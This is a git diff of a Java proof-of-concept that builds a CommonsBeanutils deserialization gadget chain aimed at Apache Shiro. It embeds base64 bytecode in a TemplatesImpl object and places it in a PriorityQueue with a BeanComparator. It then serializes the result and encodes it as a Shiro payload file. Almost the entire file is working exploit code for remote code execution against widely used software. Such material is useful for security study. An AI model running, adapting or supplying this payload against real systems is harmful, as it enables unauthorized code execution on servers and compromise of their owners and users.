@@ -1,35 +1,23 @@
-package org.example;
+package org.example.ShiroAttack;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.beanutils.BeanComparator;
-import org.example.ShiroAttack.EncPayload;
+import org.example.SerUtils;
 
 import java.lang.reflect.Field;
 import java.util.Base64;
+import java.util.Collections;
 import java.util.PriorityQueue;
+import java.util.Collections.*;
 
-/*
-* PriorityQueue.readObject()
-*  ->PriorityQueue.heapify()
-*   ->PriorityQueue.siftDown()
-*    ->PriorityQueue.siftDownUsingComparator()
-*     ->BeanComparator.compare()
-*      ->PropertyUtils.getProperty("outputProperties")
-*       ->TemplatesImpl.getOutputProperties()
-*        ->TemplatesImpl.newTransformer()
-*         ->TemplatesImpl.getTransletInstance()
-*          ->TemplatesImpl.defineTransletClasses()
-*           ->TemplatesImpl$TransletClassLoader.defineClass()
-* */
-
-public class CB1 {
+public class CB_Shiro {
     public static void setFieldValue(Object o, String fieldName, Object newVal) throws Exception {
         Field f = o.getClass().getDeclaredField(fieldName);
         f.setAccessible(true);
         f.set(o,newVal);
     }
-    public static void main(String[] args) throws Exception{
+    public static void main(String[] args) throws Exception {
         byte[] CalcCode = Base64.getDecoder().decode(
                 "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                         "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
@@ -48,24 +36,20 @@ public class CB1 {
                         "ABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAA" +
                         "bgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAARAAQAEgANABMACwAAAAQAAQAQAAEAEQAAAAIAEg==");
         TemplatesImpl calcTemp = new TemplatesImpl();
-        setFieldValue(calcTemp, "_bytecodes", new byte[][] {CalcCode});
+        setFieldValue(calcTemp, "_bytecodes", new byte[][]{CalcCode});
         setFieldValue(calcTemp, "_name", "CalcTemplatesImpl");
         setFieldValue(calcTemp, "_tfactory", new TransformerFactoryImpl());
 
         BeanComparator comparator = new BeanComparator();
-        PriorityQueue queue = new PriorityQueue<>(2,comparator);
+        PriorityQueue queue = new PriorityQueue<>(2, comparator);
         queue.add("3xsh0re");
         queue.add("CB-1");
 
-        setFieldValue(comparator,"property","outputProperties");
-        setFieldValue(queue,"queue",new Object[]{calcTemp,calcTemp});
+        setFieldValue(comparator, "property", "outputProperties");
+        setFieldValue(comparator, "comparator", Collections.reverseOrder());
+        setFieldValue(queue, "queue", new Object[]{calcTemp, calcTemp});
 
-        // 测试
-//        SerUtils.serialize(queue,"CB1.bin");
-//        SerUtils.unserialize("CB1.bin");
-
-        EncPayload.getPOC("CB1.bin");
+        SerUtils.serialize(queue,"CB-Shiro.bin");
+        EncPayload.getPOC("CB-Shiro.bin");
     }
-
-
 }
